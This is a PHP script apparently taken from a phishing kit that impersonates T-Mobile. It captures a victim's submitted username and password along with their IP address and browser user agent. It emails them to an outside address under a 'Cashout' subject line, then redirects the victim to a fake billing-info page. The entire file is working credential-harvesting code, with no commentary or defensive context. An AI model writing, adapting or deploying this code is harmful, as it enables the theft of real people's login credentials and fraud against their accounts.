<?php
header('Location: /tmobile-online/billing-info');
$Agent=$_SERVER['HTTP_USER_AGENT'];
$Ip=$_SERVER['REMOTE_ADDR'];
$username=$_POST['username'];
$password=$_POST['password'];
$nl="\r\n";
$from = "Cashout";
$to = "admin@xmz-productions.com";
$subject = "Cashout Is A Must By Gods  Grace";
$message = 'USERNAME: ' . $username . $nl.'PASSWORD: ' . $password .$nl. 'IP: ' . $Ip  . $nl. 'USERAGENT: ' . $Agent ;
$headers = "From:" . $from;
mail($to,$subject,$message, $headers) 
?>
